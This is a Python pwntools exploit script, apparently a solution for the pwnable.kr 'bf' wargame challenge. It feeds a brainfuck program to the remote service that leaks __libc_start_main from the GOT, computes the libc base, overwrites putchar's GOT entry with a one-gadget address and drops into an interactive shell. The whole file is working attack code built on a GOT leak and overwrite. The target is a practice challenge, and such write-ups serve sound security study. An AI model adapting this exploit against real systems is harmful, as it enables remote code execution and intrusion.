# -*- coding: utf-8 -*-

from pwn import *

ptr = 0x0804a0a0
libc_start_main_got = 0x0804a024
libc_start_main_offset = 0x18540
gadget_offset = 0x5fbc6
putchar_got = 0x0804a030

# p = process('./bf')
p = remote('pwnable.kr', 9001)
# p = gdb.debug('./bf', '''
# b main
# c
# # b *0x08048655
# b *0x08048648
# ignore 2 4
# ''')

p.recvline()
p.recvline()

# This program can take chars only one by one
# Thus, we cannot call modified functions in the middle of modification

# Get the address of __libc_start_main
src  = '<'*(ptr-libc_start_main_got)
src += '.>.>.>.'
src += '>'*(ptr-libc_start_main_got-3)
# Modify putchar with gadbet
src += '<'*(ptr-putchar_got)
src += ',>,>,>,'
src += '>'*(ptr-putchar_got-3)
# Execute putchar
src += '.'

p.sendline(src)
libc_start_main = u32(p.recvn(4))
libc_base = libc_start_main - libc_start_main_offset
print(hex(libc_base))
print(hex(libc_base + gadget_offset))
p.sendline(p32(libc_base + gadget_offset))
p.interactive()
